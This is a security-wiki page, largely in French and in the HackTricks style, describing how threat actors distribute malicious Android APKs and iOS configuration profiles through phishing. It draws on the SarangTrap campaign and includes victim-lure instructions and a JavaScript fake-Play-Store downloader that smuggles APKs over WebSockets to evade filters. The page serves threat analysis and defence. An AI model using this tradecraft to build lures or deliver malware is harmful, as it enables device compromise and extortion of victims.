# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page couvre les techniques utilisées par des threat actors pour distribuer des **malicious Android APKs** et des **iOS mobile-configuration profiles** via phishing (SEO, social engineering, fake stores, dating apps, etc.).
> Le contenu est adapté de la campagne SarangTrap exposée par Zimperium zLabs (2025) et d’autres recherches publiques.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Register des dizaines de domaines ressemblants (dating, cloud share, car service…).
– Utiliser des mots-clés en langue locale et des emojis dans l’élément `<title>` pour être mieux classé dans Google.
– Héberger *à la fois* les instructions d’installation Android (`.apk`) et iOS sur la même landing page.
2. **First Stage Download**
* Android: lien direct vers un APK *unsigned* ou “third-party store”.
* iOS: `itms-services://` ou lien HTTPS simple vers un profil **mobileconfig** malveillant (voir ci-dessous).
3. **Android Post-install Behaviour**
* L’exécution conditionnée par C2, l’abus de permissions, les bypasses de dropper, la collecte en arrière-plan et d’autres comportements de malware après installation sont couverts sur la page dédiée Android Malware Post-Exploitation ci-dessous.
4. **iOS Delivery Technique**
* Un seul **mobile-configuration profile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. pour inscrire l’appareil dans une supervision de type “MDM”.
* Instructions de social-engineering :
1. Ouvrir Settings ➜ *Profile downloaded*.
2. Appuyer sur *Install* trois fois (captures d’écran sur la page de phishing).
3. Faire confiance au profil unsigned ➜ l’attaquant obtient les privilèges *Contacts* et *Photo* sans revue de l’App Store.
5. **iOS Web Clip Payload (phishing app icon)**
* Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing sur l’écran d’accueil** avec une icône/étiquette brandée.
* Les Web Clips peuvent s’exécuter en **plein écran** (cache l’interface du navigateur) et être marqués **non-removable**, obligeant la victime à supprimer le profil pour retirer l’icône.
6. **Network Layer**
* Plain HTTP, souvent sur le port 80 avec un en-tête HOST comme `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).

## Android Malware Post-Exploitation

Pour les techniques de Android malware post-install comme C2, l’abus d’Accessibility, les overlays, l’automatisation ATS, le chargement de DEX en plusieurs étapes, les premium SMS et la persistance, voir :

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Les attackers remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré dans des leurres ressemblant à Google Play. Cela masque l’URL du payload, contourne les filtres URL/extension et conserve une UX d’installation réaliste.

Flux client typique observé en conditions réelles :

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Pourquoi cela contourne les contrôles simples :
- Aucune URL statique d'APK n'est exposée ; le payload est reconstruit en mémoire à partir de frames WebSocket.
- Les filtres URL/MIME/extension qui bloquent les réponses .apk directes peuvent manquer des données binaires tunnelées via WebSockets/Socket.IO.
- Les crawlers et les bacs à sable URL qui n'exécutent pas WebSockets ne récupéreront pas le payload.

Voir aussi WebSocket tradecraft et tooling :

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
